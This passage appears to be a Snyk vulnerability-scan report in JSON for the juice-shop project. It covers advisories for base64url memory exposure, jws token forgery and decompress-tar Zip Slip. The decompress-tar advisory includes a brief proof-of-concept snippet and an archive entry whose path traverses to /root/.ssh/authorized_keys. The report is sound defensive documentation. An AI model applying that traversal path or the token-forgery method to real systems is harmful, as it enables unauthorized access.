        "description": "## Overview\r\n[base64url](https://www.npmjs.com/package/base64url) Converting to, and from, base64url.\r\n\r\nAffected versions of this package are vulnerable to Uninitialized Memory Exposure. An attacker could extract sensitive data from uninitialized memory or may cause a Denial of Service (DoS) by passing in a large number, in setups where typed user input can be passed (e.g. from JSON).\r\n\r\n## Details\r\nThe Buffer class on Node.js is a mutable array of binary data, and can be initialized with a string, array or number.\r\n```js\r\nconst buf1 = new Buffer([1,2,3]);\r\n// creates a buffer containing [01, 02, 03]\r\nconst buf2 = new Buffer('test');\r\n// creates a buffer containing ASCII bytes [74, 65, 73, 74]\r\nconst buf3 = new Buffer(10);\r\n// creates a buffer of length 10\r\n```\r\n\r\nThe first two variants simply create a binary representation of the value it received. The last one, however, pre-allocates a buffer of the specified size, making it a useful buffer, especially when reading data from a stream.\r\nWhen using the number constructor of Buffer, it will allocate the memory, but will not fill it with zeros. Instead, the allocated buffer will hold whatever was in memory at the time. If the buffer is not `zeroed` by using `buf.fill(0)`, it may leak sensitive information like keys, source code, and system info.\r\n\r\n\r\n## Remediation\r\nUpgrade `base64url` to version 3.0.0 or higher.\r\n**Note** This is vulnerable only for Node <=4\r\n\r\n## References\r\n- [HackerOne Report](https://hackerone.com/reports/321687)\r\n- [GitHub Commit](https://github.com/brianloveswords/base64url/commit/4355cb294123e86171daa9389f7afe6d2b2b9dae)",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-201"
          ],
          "NSP": [
            "658"
          ],
          "GHSA": [
            "GHSA-rvg8-pwq2-xj7q"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-BASE64URL-12139",
            "SNYK-JS-BASE64URL-12139",
            "npm:base64url:20180511"
          ]
        },
        "packageName": "base64url",
        "proprietary": false,
        "creationTime": "2018-03-04T08:54:39.014000Z",
        "functions_new": [
          {
            "version": [
              "<=1.0.6"
            ],
            "functionId": {
              "filePath": "index.js",
              "functionName": "padString"
            }
          },
          {
            "version": [
              ">=2.0.0 <3.0.0"
            ],
            "functionId": {
              "filePath": "dist/pad-string.js",
              "functionName": "padString"
            }
          }
        ],
        "alternativeIds": [
          "SNYK-JS-BASE64URL-12139"
        ],
        "disclosureTime": "2018-05-11T08:54:39Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Functional",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2018-05-13T14:26:26Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-06T14:03:35.868977Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "jsonwebtoken@0.4.0",
          "jws@0.2.6",
          "base64url@0.0.6"
        ],
        "upgradePath": [
          false,
          "jsonwebtoken@5.0.0",
          "jws@3.2.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "base64url",
        "version": "0.0.6"
      },
      {
        "id": "npm:base64url:20180511",
        "title": "Uninitialized Memory Exposure",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H/E:F/RL:O/RC:C",
        "credit": [
          "ChALkeR"
        ],
        "semver": {
          "vulnerable": [
            "<3.0.0"
          ]
        },
        "exploit": "Functional",
        "fixedIn": [
          "3.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.1,
        "functions": [
          {
            "version": [
              "<=1.0.6"
            ],
            "functionId": {
              "filePath": "index.js",
              "className": null,
              "functionName": "padString"
            }
          },
          {
            "version": [
              ">=2.0.0 <3.0.0"
            ],
            "functionId": {
              "filePath": "dist/pad-string.js",
              "className": null,
              "functionName": "padString"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "base64url",
        "references": [
          {
            "url": "https://github.com/brianloveswords/base64url/commit/4355cb294123e86171daa9389f7afe6d2b2b9dae",
            "title": "GitHub Commit"
          },
          {
            "url": "https://hackerone.com/reports/321687",
            "title": "HackerOne Report"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H/E:F/RL:O/RC:C",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:03:35.868977Z"
          }
        ],
        "description": "## Overview\r\n[base64url](https://www.npmjs.com/package/base64url) Converting to, and from, base64url.\r\n\r\nAffected versions of this package are vulnerable to Uninitialized Memory Exposure. An attacker could extract sensitive data from uninitialized memory or may cause a Denial of Service (DoS) by passing in a large number, in setups where typed user input can be passed (e.g. from JSON).\r\n\r\n## Details\r\nThe Buffer class on Node.js is a mutable array of binary data, and can be initialized with a string, array or number.\r\n```js\r\nconst buf1 = new Buffer([1,2,3]);\r\n// creates a buffer containing [01, 02, 03]\r\nconst buf2 = new Buffer('test');\r\n// creates a buffer containing ASCII bytes [74, 65, 73, 74]\r\nconst buf3 = new Buffer(10);\r\n// creates a buffer of length 10\r\n```\r\n\r\nThe first two variants simply create a binary representation of the value it received. The last one, however, pre-allocates a buffer of the specified size, making it a useful buffer, especially when reading data from a stream.\r\nWhen using the number constructor of Buffer, it will allocate the memory, but will not fill it with zeros. Instead, the allocated buffer will hold whatever was in memory at the time. If the buffer is not `zeroed` by using `buf.fill(0)`, it may leak sensitive information like keys, source code, and system info.\r\n\r\n\r\n## Remediation\r\nUpgrade `base64url` to version 3.0.0 or higher.\r\n**Note** This is vulnerable only for Node <=4\r\n\r\n## References\r\n- [HackerOne Report](https://hackerone.com/reports/321687)\r\n- [GitHub Commit](https://github.com/brianloveswords/base64url/commit/4355cb294123e86171daa9389f7afe6d2b2b9dae)",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-201"
          ],
          "NSP": [
            "658"
          ],
          "GHSA": [
            "GHSA-rvg8-pwq2-xj7q"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-BASE64URL-12139",
            "SNYK-JS-BASE64URL-12139",
            "npm:base64url:20180511"
          ]
        },
        "packageName": "base64url",
        "proprietary": false,
        "creationTime": "2018-03-04T08:54:39.014000Z",
        "functions_new": [
          {
            "version": [
              "<=1.0.6"
            ],
            "functionId": {
              "filePath": "index.js",
              "functionName": "padString"
            }
          },
          {
            "version": [
              ">=2.0.0 <3.0.0"
            ],
            "functionId": {
              "filePath": "dist/pad-string.js",
              "functionName": "padString"
            }
          }
        ],
        "alternativeIds": [
          "SNYK-JS-BASE64URL-12139"
        ],
        "disclosureTime": "2018-05-11T08:54:39Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Functional",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2018-05-13T14:26:26Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-06T14:03:35.868977Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "jsonwebtoken@0.4.0",
          "jws@0.2.6",
          "jwa@0.0.1",
          "base64url@0.0.6"
        ],
        "upgradePath": [
          false,
          "jsonwebtoken@5.0.0",
          "jws@3.2.2",
          "jwa@1.4.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "base64url",
        "version": "0.0.6"
      },
      {
        "id": "npm:base64url:20180511",
        "title": "Uninitialized Memory Exposure",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H/E:F/RL:O/RC:C",
        "credit": [
          "ChALkeR"
        ],
        "semver": {
          "vulnerable": [
            "<3.0.0"
          ]
        },
        "exploit": "Functional",
        "fixedIn": [
          "3.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.1,
        "functions": [
          {
            "version": [
              "<=1.0.6"
            ],
            "functionId": {
              "filePath": "index.js",
              "className": null,
              "functionName": "padString"
            }
          },
          {
            "version": [
              ">=2.0.0 <3.0.0"
            ],
            "functionId": {
              "filePath": "dist/pad-string.js",
              "className": null,
              "functionName": "padString"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "base64url",
        "references": [
          {
            "url": "https://github.com/brianloveswords/base64url/commit/4355cb294123e86171daa9389f7afe6d2b2b9dae",
            "title": "GitHub Commit"
          },
          {
            "url": "https://hackerone.com/reports/321687",
            "title": "HackerOne Report"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H/E:F/RL:O/RC:C",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:03:35.868977Z"
          }
        ],
        "description": "## Overview\r\n[base64url](https://www.npmjs.com/package/base64url) Converting to, and from, base64url.\r\n\r\nAffected versions of this package are vulnerable to Uninitialized Memory Exposure. An attacker could extract sensitive data from uninitialized memory or may cause a Denial of Service (DoS) by passing in a large number, in setups where typed user input can be passed (e.g. from JSON).\r\n\r\n## Details\r\nThe Buffer class on Node.js is a mutable array of binary data, and can be initialized with a string, array or number.\r\n```js\r\nconst buf1 = new Buffer([1,2,3]);\r\n// creates a buffer containing [01, 02, 03]\r\nconst buf2 = new Buffer('test');\r\n// creates a buffer containing ASCII bytes [74, 65, 73, 74]\r\nconst buf3 = new Buffer(10);\r\n// creates a buffer of length 10\r\n```\r\n\r\nThe first two variants simply create a binary representation of the value it received. The last one, however, pre-allocates a buffer of the specified size, making it a useful buffer, especially when reading data from a stream.\r\nWhen using the number constructor of Buffer, it will allocate the memory, but will not fill it with zeros. Instead, the allocated buffer will hold whatever was in memory at the time. If the buffer is not `zeroed` by using `buf.fill(0)`, it may leak sensitive information like keys, source code, and system info.\r\n\r\n\r\n## Remediation\r\nUpgrade `base64url` to version 3.0.0 or higher.\r\n**Note** This is vulnerable only for Node <=4\r\n\r\n## References\r\n- [HackerOne Report](https://hackerone.com/reports/321687)\r\n- [GitHub Commit](https://github.com/brianloveswords/base64url/commit/4355cb294123e86171daa9389f7afe6d2b2b9dae)",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-201"
          ],
          "NSP": [
            "658"
          ],
          "GHSA": [
            "GHSA-rvg8-pwq2-xj7q"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-BASE64URL-12139",
            "SNYK-JS-BASE64URL-12139",
            "npm:base64url:20180511"
          ]
        },
        "packageName": "base64url",
        "proprietary": false,
        "creationTime": "2018-03-04T08:54:39.014000Z",
        "functions_new": [
          {
            "version": [
              "<=1.0.6"
            ],
            "functionId": {
              "filePath": "index.js",
              "functionName": "padString"
            }
          },
          {
            "version": [
              ">=2.0.0 <3.0.0"
            ],
            "functionId": {
              "filePath": "dist/pad-string.js",
              "functionName": "padString"
            }
          }
        ],
        "alternativeIds": [
          "SNYK-JS-BASE64URL-12139"
        ],
        "disclosureTime": "2018-05-11T08:54:39Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Functional",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2018-05-13T14:26:26Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-06T14:03:35.868977Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "express-jwt@0.1.3",
          "jsonwebtoken@0.1.0",
          "jws@0.2.6",
          "base64url@0.0.6"
        ],
        "upgradePath": [
          false,
          "express-jwt@3.0.0",
          "jsonwebtoken@5.7.0",
          "jws@3.2.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "base64url",
        "version": "0.0.6"
      },
      {
        "id": "npm:base64url:20180511",
        "title": "Uninitialized Memory Exposure",
        "CVSSv3": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H/E:F/RL:O/RC:C",
        "credit": [
          "ChALkeR"
        ],
        "semver": {
          "vulnerable": [
            "<3.0.0"
          ]
        },
        "exploit": "Functional",
        "fixedIn": [
          "3.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 7.1,
        "functions": [
          {
            "version": [
              "<=1.0.6"
            ],
            "functionId": {
              "filePath": "index.js",
              "className": null,
              "functionName": "padString"
            }
          },
          {
            "version": [
              ">=2.0.0 <3.0.0"
            ],
            "functionId": {
              "filePath": "dist/pad-string.js",
              "className": null,
              "functionName": "padString"
            }
          }
        ],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "base64url",
        "references": [
          {
            "url": "https://github.com/brianloveswords/base64url/commit/4355cb294123e86171daa9389f7afe6d2b2b9dae",
            "title": "GitHub Commit"
          },
          {
            "url": "https://hackerone.com/reports/321687",
            "title": "HackerOne Report"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:H/E:F/RL:O/RC:C",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 7.1,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:03:35.868977Z"
          }
        ],
        "description": "## Overview\r\n[base64url](https://www.npmjs.com/package/base64url) Converting to, and from, base64url.\r\n\r\nAffected versions of this package are vulnerable to Uninitialized Memory Exposure. An attacker could extract sensitive data from uninitialized memory or may cause a Denial of Service (DoS) by passing in a large number, in setups where typed user input can be passed (e.g. from JSON).\r\n\r\n## Details\r\nThe Buffer class on Node.js is a mutable array of binary data, and can be initialized with a string, array or number.\r\n```js\r\nconst buf1 = new Buffer([1,2,3]);\r\n// creates a buffer containing [01, 02, 03]\r\nconst buf2 = new Buffer('test');\r\n// creates a buffer containing ASCII bytes [74, 65, 73, 74]\r\nconst buf3 = new Buffer(10);\r\n// creates a buffer of length 10\r\n```\r\n\r\nThe first two variants simply create a binary representation of the value it received. The last one, however, pre-allocates a buffer of the specified size, making it a useful buffer, especially when reading data from a stream.\r\nWhen using the number constructor of Buffer, it will allocate the memory, but will not fill it with zeros. Instead, the allocated buffer will hold whatever was in memory at the time. If the buffer is not `zeroed` by using `buf.fill(0)`, it may leak sensitive information like keys, source code, and system info.\r\n\r\n\r\n## Remediation\r\nUpgrade `base64url` to version 3.0.0 or higher.\r\n**Note** This is vulnerable only for Node <=4\r\n\r\n## References\r\n- [HackerOne Report](https://hackerone.com/reports/321687)\r\n- [GitHub Commit](https://github.com/brianloveswords/base64url/commit/4355cb294123e86171daa9389f7afe6d2b2b9dae)",
        "epssDetails": null,
        "identifiers": {
          "CVE": [],
          "CWE": [
            "CWE-201"
          ],
          "NSP": [
            "658"
          ],
          "GHSA": [
            "GHSA-rvg8-pwq2-xj7q"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-BASE64URL-12139",
            "SNYK-JS-BASE64URL-12139",
            "npm:base64url:20180511"
          ]
        },
        "packageName": "base64url",
        "proprietary": false,
        "creationTime": "2018-03-04T08:54:39.014000Z",
        "functions_new": [
          {
            "version": [
              "<=1.0.6"
            ],
            "functionId": {
              "filePath": "index.js",
              "functionName": "padString"
            }
          },
          {
            "version": [
              ">=2.0.0 <3.0.0"
            ],
            "functionId": {
              "filePath": "dist/pad-string.js",
              "functionName": "padString"
            }
          }
        ],
        "alternativeIds": [
          "SNYK-JS-BASE64URL-12139"
        ],
        "disclosureTime": "2018-05-11T08:54:39Z",
        "exploitDetails": {
          "sources": [
            "Snyk"
          ],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Functional",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Proof of Concept",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2018-05-13T14:26:26Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-06T14:03:35.868977Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "express-jwt@0.1.3",
          "jsonwebtoken@0.1.0",
          "jws@0.2.6",
          "jwa@0.0.1",
          "base64url@0.0.6"
        ],
        "upgradePath": [
          false,
          "express-jwt@3.0.0",
          "jsonwebtoken@5.7.0",
          "jws@3.2.2",
          "jwa@1.4.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "base64url",
        "version": "0.0.6"
      },
      {
        "id": "npm:jws:20160726",
        "title": "Forgeable Public/Private Tokens",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
        "credit": [
          "Brian Brennan and Tim McLean"
        ],
        "semver": {
          "vulnerable": [
            "<3.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "3.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 8.7,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jws",
        "references": [
          {
            "url": "https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/",
            "title": "Auth0 Blog"
          },
          {
            "url": "https://github.com/auth0/node-jws/commit/585d0e1e97b6747c10cf5b7689ccc5618a89b299%23diff-4ac32a78649ca5bdd8e0ba38b7006a1e",
            "title": "GitHub Changelog"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:03:35.727712Z"
          }
        ],
        "description": "## Overview\r\n[`jws`](https://www.npmjs.com/package/jws) is an implementation of JSON Web Signatures.\r\nAffected versions of this package are vulnerable to an Authentication Bypass attack, due to the \"algorithm\" not being enforced in `jws.verify()`. Attackers are given the opportunity to choose the algorithm sent to the server and generate signatures with arbitrary contents. The server expects an asymmetric key (RSA) but is sent a symmetric key (HMAC-SHA) with RSA's public key, so instead of going through a key validation process, the server will think the public key is actually an HMAC private key.\r\n\r\n## Remediation\r\nUpgrade `jws` to version `3.0.0` or later.\r\n\r\n## References\r\n- [Auth0 Blog](https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/)",
        "epssDetails": null,
        "identifiers": {
          "CVE": [
            "CVE-2016-1000223"
          ],
          "CWE": [
            "CWE-310"
          ],
          "NSP": [
            "88"
          ],
          "GHSA": [
            "GHSA-gjcw-v447-2w7q"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-JWS-10125",
            "SNYK-JS-JWS-10125",
            "npm:jws:20160726"
          ]
        },
        "packageName": "jws",
        "proprietary": false,
        "creationTime": "2016-07-26T22:10:17.386000Z",
        "functions_new": [],
        "alternativeIds": [
          "SNYK-JS-JWS-10125"
        ],
        "disclosureTime": "2016-07-26T17:21:17Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2016-07-26T17:21:17Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-06T14:03:35.727712Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "jsonwebtoken@0.4.0",
          "jws@0.2.6"
        ],
        "upgradePath": [
          false,
          "jsonwebtoken@5.0.0",
          "jws@3.2.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jws",
        "version": "0.2.6"
      },
      {
        "id": "npm:jws:20160726",
        "title": "Forgeable Public/Private Tokens",
        "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
        "credit": [
          "Brian Brennan and Tim McLean"
        ],
        "semver": {
          "vulnerable": [
            "<3.0.0"
          ]
        },
        "exploit": "Not Defined",
        "fixedIn": [
          "3.0.0"
        ],
        "patches": [],
        "insights": {
          "triageAdvice": null
        },
        "language": "js",
        "severity": "high",
        "cvssScore": 8.7,
        "functions": [],
        "malicious": false,
        "isDisputed": false,
        "moduleName": "jws",
        "references": [
          {
            "url": "https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/",
            "title": "Auth0 Blog"
          },
          {
            "url": "https://github.com/auth0/node-jws/commit/585d0e1e97b6747c10cf5b7689ccc5618a89b299%23diff-4ac32a78649ca5bdd8e0ba38b7006a1e",
            "title": "GitHub Changelog"
          }
        ],
        "cvssDetails": [],
        "cvssSources": [
          {
            "type": "primary",
            "vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N",
            "assigner": "Snyk",
            "severity": "high",
            "baseScore": 8.7,
            "cvssVersion": "3.1",
            "modificationTime": "2024-03-06T14:03:35.727712Z"
          }
        ],
        "description": "## Overview\r\n[`jws`](https://www.npmjs.com/package/jws) is an implementation of JSON Web Signatures.\r\nAffected versions of this package are vulnerable to an Authentication Bypass attack, due to the \"algorithm\" not being enforced in `jws.verify()`. Attackers are given the opportunity to choose the algorithm sent to the server and generate signatures with arbitrary contents. The server expects an asymmetric key (RSA) but is sent a symmetric key (HMAC-SHA) with RSA's public key, so instead of going through a key validation process, the server will think the public key is actually an HMAC private key.\r\n\r\n## Remediation\r\nUpgrade `jws` to version `3.0.0` or later.\r\n\r\n## References\r\n- [Auth0 Blog](https://auth0.com/blog/2015/03/31/critical-vulnerabilities-in-json-web-token-libraries/)",
        "epssDetails": null,
        "identifiers": {
          "CVE": [
            "CVE-2016-1000223"
          ],
          "CWE": [
            "CWE-310"
          ],
          "NSP": [
            "88"
          ],
          "GHSA": [
            "GHSA-gjcw-v447-2w7q"
          ],
          "ALTERNATIVE": [
            "SNYK-JS-JWS-10125",
            "SNYK-JS-JWS-10125",
            "npm:jws:20160726"
          ]
        },
        "packageName": "jws",
        "proprietary": false,
        "creationTime": "2016-07-26T22:10:17.386000Z",
        "functions_new": [],
        "alternativeIds": [
          "SNYK-JS-JWS-10125"
        ],
        "disclosureTime": "2016-07-26T17:21:17Z",
        "exploitDetails": {
          "sources": [],
          "maturityLevels": [
            {
              "type": "secondary",
              "level": "Not Defined",
              "format": "CVSSv3"
            },
            {
              "type": "primary",
              "level": "Not Defined",
              "format": "CVSSv4"
            }
          ]
        },
        "packageManager": "npm",
        "publicationTime": "2016-07-26T17:21:17Z",
        "severityBasedOn": "CVSS",
        "modificationTime": "2024-03-06T14:03:35.727712Z",
        "socialTrendAlert": false,
        "severityWithCritical": "high",
        "from": [
          "juice-shop@19.0.0",
          "express-jwt@0.1.3",
          "jsonwebtoken@0.1.0",
          "jws@0.2.6"
        ],
        "upgradePath": [
          false,
          "express-jwt@3.0.0",
          "jsonwebtoken@5.7.0",
          "jws@3.2.2"
        ],
        "isUpgradable": true,
        "isPatchable": false,
        "name": "jws",
        "version": "0.2.6"
      }
    ],
    "ok": false,
    "dependencyCount": 981,
    "org": "samoylenko-sd4",
    "policy": "# Snyk (https://snyk.io) policy file, patches or ignores known vulnerabilities.\nversion: v1.25.1\nignore: {}\npatch: {}\n",
    "isPrivate": true,
    "licensesPolicy": {
      "severities": {},
      "orgLicenseRules": {
        "AGPL-1.0": {
          "licenseType": "AGPL-1.0",
          "severity": "high",
          "instructions": ""
        },
        "AGPL-3.0": {
          "licenseType": "AGPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "Artistic-1.0": {
          "licenseType": "Artistic-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "Artistic-2.0": {
          "licenseType": "Artistic-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "CDDL-1.0": {
          "licenseType": "CDDL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "CPOL-1.02": {
          "licenseType": "CPOL-1.02",
          "severity": "high",
          "instructions": ""
        },
        "EPL-1.0": {
          "licenseType": "EPL-1.0",
          "severity": "medium",
          "instructions": ""
        },
        "GPL-2.0": {
          "licenseType": "GPL-2.0",
          "severity": "high",
          "instructions": ""
        },
        "GPL-3.0": {
          "licenseType": "GPL-3.0",
          "severity": "high",
          "instructions": ""
        },
        "LGPL-2.0": {
          "licenseType": "LGPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-2.1": {
          "licenseType": "LGPL-2.1",
          "severity": "medium",
          "instructions": ""
        },
        "LGPL-3.0": {
          "licenseType": "LGPL-3.0",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-1.1": {
          "licenseType": "MPL-1.1",
          "severity": "medium",
          "instructions": ""
        },
        "MPL-2.0": {
          "licenseType": "MPL-2.0",
          "severity": "medium",
          "instructions": ""
        },
        "MS-RL": {
          "licenseType": "MS-RL",
          "severity": "medium",
          "instructions": ""
        },
        "SimPL-2.0": {
          "licenseType": "SimPL-2.0",
          "severity": "high",
          "instructions": ""
        }
      }
    },
    "packageManager": "npm",
    "ignoreSettings": {
      "adminOnly": false,
      "reasonRequired": false,
      "disregardFilesystemIgnores": false
    },
    "summary": "76 vulnerable dependency paths",
    "remediation": {
      "unresolved": [
        {
          "id": "SNYK-JS-DECOMPRESSTAR-559095",
          "title": "Arbitrary File Write via Archive Extraction (Zip Slip)",
          "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N/E:P/RL:U/RC:C",
          "credit": [
            "Oscar Arnflo"
          ],
          "semver": {
            "vulnerable": [
              "*"
            ]
          },
          "exploit": "Proof of Concept",
          "fixedIn": [],
          "patches": [],
          "insights": {
            "triageAdvice": null
          },
          "language": "js",
          "severity": "medium",
          "cvssScore": 6.3,
          "functions": [
            {
              "version": [
                "*"
              ],
              "functionId": {
                "filePath": "index.js",
                "className": null,
                "functionName": "module.exports"
              }
            }
          ],
          "malicious": false,
          "isDisputed": false,
          "moduleName": "decompress-tar",
          "references": [
            {
              "url": "https://github.com/kevva/decompress/pull/73",
              "title": "GitHub Fix PR"
            },
            {
              "url": "https://github.com/kevva/decompress/issues/71",
              "title": "GitHub Issue"
            },
            {
              "url": "https://github.com/kevva/decompress-tar/pull/12",
              "title": "GitHub PR decompress-tar"
            },
            {
              "url": "https://www.npmjs.com/advisories/1217",
              "title": "NPM Advisory"
            }
          ],
          "cvssDetails": [
            {
              "assigner": "NVD",
              "severity": "critical",
              "cvssV3Vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
              "cvssV3BaseScore": 9.8,
              "modificationTime": "2024-03-11T09:50:22.598107Z"
            }
          ],
          "cvssSources": [
            {
              "type": "primary",
              "vector": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:N/A:N/E:P/RL:U/RC:C",
              "assigner": "Snyk",
              "severity": "medium",
              "baseScore": 6.3,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-06T14:00:51.927791Z"
            },
            {
              "type": "secondary",
              "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
              "assigner": "NVD",
              "severity": "critical",
              "baseScore": 9.8,
              "cvssVersion": "3.1",
              "modificationTime": "2024-03-11T09:50:22.598107Z"
            }
          ],
          "description": "## Overview\n[decompress-tar](https://github.com/kevva/decompress-tar) is a tar plugin for decompress.\n\nAffected versions of this package are vulnerable to Arbitrary File Write via Archive Extraction (Zip Slip). It is possible to bypass the security measures provided by decompress  and conduct ZIP path traversal through symlinks.\r\n\r\n### PoC\r\n\r\n```\r\nconst decompress = require('decompress');\r\n\r\ndecompress('slip.tar.gz', 'dist').then(files => {\r\n\tconsole.log('done!');\r\n});\r\n```\n\n## Details\n\nIt is exploited using a specially crafted zip archive, that holds path traversal filenames. When exploited, a filename in a malicious archive is concatenated to the target extraction directory, which results in the final path ending up outside of the target folder. For instance, a zip may hold a file with a \"../../file.exe\" location and thus break out of the target folder. If an executable or a configuration file is overwritten with a file containing malicious code, the problem can turn into an arbitrary code execution issue quite easily.\n\nThe following is an example of a zip archive with one benign file and one malicious file. Extracting the malicous file will result in traversing out of the target folder, ending up in `/root/.ssh/` overwriting the `authorized_keys` file:\n\n```\n\n+2018-04-15 22:04:29 ..... 19 19 good.txt\n\n+2018-04-15 22:04:42 ..... 20 20 ../../../../../../root/.ssh/authorized_keys\n\n```\n\n## Remediation\nThere is no fixed version for `decompress-tar`.\n## References\n- [GitHub Fix PR](https://github.com/kevva/decompress/pull/73)\n- [GitHub Issue](https://github.com/kevva/decompress/issues/71)\n- [GitHub PR decompress-tar](https://github.com/kevva/decompress-tar/pull/12)\n- [NPM Advisory](https://www.npmjs.com/advisories/1217)\n",
          "epssDetails": {
            "percentile": "0.72010",
            "probability": "0.00737",
            "modelVersion": "v2025.03.14"
          },
          "identifiers": {
            "CVE": [
              "CVE-2020-12265"
            ],
            "CWE": [
              "CWE-29"
            ],
            "NSP": [
              "1217"
            ],
            "GHSA": [
              "GHSA-qgfr-5hqp-vrw9"
            ]
          },
          "packageName": "decompress-tar",
          "proprietary": false,
          "creationTime": "2020-03-02T11:17:35.161853Z",
          "functions_new": [
            {
              "version": [
                "*"
